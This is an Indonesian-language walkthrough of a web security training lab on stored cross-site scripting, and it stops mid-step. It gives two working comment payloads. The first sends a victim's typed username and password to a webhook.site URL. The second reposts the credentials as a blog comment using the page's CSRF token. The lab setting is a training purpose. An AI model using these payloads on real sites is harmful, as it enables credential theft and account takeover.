# Exploiting cross-site scripting to capture passwords

Lab ini berisi kerentanan **Stored XSS** pada fitur komentar blog. Ada pengguna korban yang disimulasikan yang akan melihat semua komentar setelah diposting.

Untuk menyelesaikan lab ini, kamu harus mengeksploitasi kerentanan tersebut untuk **mencuri (exfiltrate) username dan password korban**, lalu menggunakan kredensial tersebut untuk **login ke akun korban**.

---

### Catatan:

Untuk mencegah platform Academy digunakan untuk menyerang pihak lain, firewall kami memblokir interaksi antara lab dengan sistem eksternal sembarangan. Jadi untuk menyelesaikan lab ini, kamu harus menggunakan server publik default dari **Burp Collaborator**.

Beberapa pengguna mungkin menemukan bahwa ada solusi alternatif untuk lab ini yang tidak memerlukan Burp Collaborator. Namun, cara tersebut jauh lebih “kasar” dan kurang halus dibandingkan teknik exfiltrasi kredensial.


## Solusi


Disni kita tidak menggunakn **Burp Collaborator** karena keterbatasan burp comunnity.

1. Menggunakan situs [webhook.site](https://webhook.site/).

2. Copy url dari webhook site (`https://webhook.site/<ID_WEBHOOK_SITE>`).

3. Kirim payload berikut di komentar blog, lalu ganti bagian **ID_WEBHOOK_SITE** dengan ID dari webhooksite:

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://webhook.site/<ID_WEBHOOK_SITE>',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

Script ini akan membuat siapa pun yang melihat komentar tersebut mengirim request POST` berisi username dan password mereka ke webhooksite.

4. Kembali ke tab webhooksite,Kamu akan melihat adanya HTTP interaction. Jika belum muncul, tunggu beberapa detik lalu coba lagi.

5. Catat nilai username dan password korban dari isi `POST` body tersebut.

6. Gunakan kredensial itu untuk login sebagai user korban.


## Alternatif lain

1. Masukkna paylaod berikut di postignan 

```html
<!-- Completed payload -->
<input type="text" name="username">
<input type="password" name="password" onchange="dothis()">

<script>
    function dothis() {
    var username = document.getElementsByName('username')[0].value
    var password = document.getElementsByName('password')[0].value
    var token = document.getElementsByName('csrf')[0].value
    var data = new FormData();

    data.append('csrf', token);
    data.append('postId', 2); // Chenge '2' to correct postId
    data.append('comment', `${username}:${password}`);
    data.append('name', 'victim');
    data.append('email', 'blah@email.com');
    data.append('website', 'http://blah.com');

    fetch('/post/comment', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
    };
</script>
```

Satu-satunya hal yang perlu dilakukan adalah mengubah angka **‘2’** pada `data.append('postId', 2);` agar sesuai dengan **postId** dari blog yang sedang kamu komentari.

Kamu bisa dengan mudah menemukan nilai ini di bagian akhir URL blog tersebut.

2. Kunjungi halan blog degna id `2` dan akan melihat seperti ini :
